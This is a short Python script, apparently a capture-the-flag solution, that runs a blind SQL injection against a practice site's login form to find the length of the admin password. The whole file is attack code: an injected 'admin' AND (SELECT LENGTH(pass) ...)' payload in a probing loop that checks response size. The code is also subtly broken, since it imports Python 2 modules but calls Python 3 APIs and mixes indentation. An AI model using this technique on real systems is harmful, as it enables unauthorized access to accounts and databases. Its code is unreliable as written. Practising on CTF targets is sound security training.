import urllib
import urllib2
url = 'http://ctfq.sweetduet.info:10080/~q6/'

def main():
    for i in range(1, 100):
        payload = {
            "id": "admin' AND (SELECT LENGTH(pass) FROM user WHERE id = 'admin') = {counter} --".format(counter=i),
            "pass": "",
        }

        post_data = urllib.parse.urlencode(payload).encode("utf-8")
        req = urllib.request.Request(url, post_data)


        res = urllib.request.urlopen(req)
        if int(res.headers["content-length"]) > 2000:
            print("length of the password is {counter}".format(counter=i))
            break
		
if __name__ == '__main__':
	main()